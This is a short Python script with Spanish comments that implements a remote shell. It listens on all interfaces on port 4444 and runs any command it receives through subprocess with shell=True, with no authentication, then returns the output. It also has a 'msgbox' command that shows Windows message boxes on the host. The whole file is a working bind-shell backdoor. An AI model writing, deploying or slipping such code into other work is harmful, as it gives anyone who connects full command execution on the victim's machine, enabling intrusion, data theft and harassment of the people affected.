# -*- coding: latin-1 -*-
import socket
import subprocess
import ctypes

def start_server():
    host = '0.0.0.0'  # Escuchar en todas las interfaces de red
    port = 4444

    while True:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(5)

        print(f"Servidor a la espera de conexiones en el puerto {port}...")

        try:
            client_socket, client_address = server.accept()
            print(f"Conexión establecida desde {client_address[0]}:{client_address[1]}")

            # Iniciar la shell remota
            while True:
                command = client_socket.recv(1024).decode()

                if not command:
                    break

                if command.lower() == 'exit':
                    client_socket.close()
                    break

                # Verificar si el comando es para mostrar un MessageBox
                if command.startswith("msgbox"):
                    parts = command.split(" ")
                    if len(parts) >= 4:
                        title = parts[2]
                        message = parts[3:]
                        message = " ".join(message)
                        ctypes.windll.user32.MessageBoxW(0, message, title, 0)

                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
                except Exception as e:
                    result = str(e)

                client_socket.send(result.encode())
        except ConnectionResetError:
            # Captura el error de conexión cerrada abruptamente
            continue
        finally:
            server.close()

if __name__ == "__main__":
    start_server()
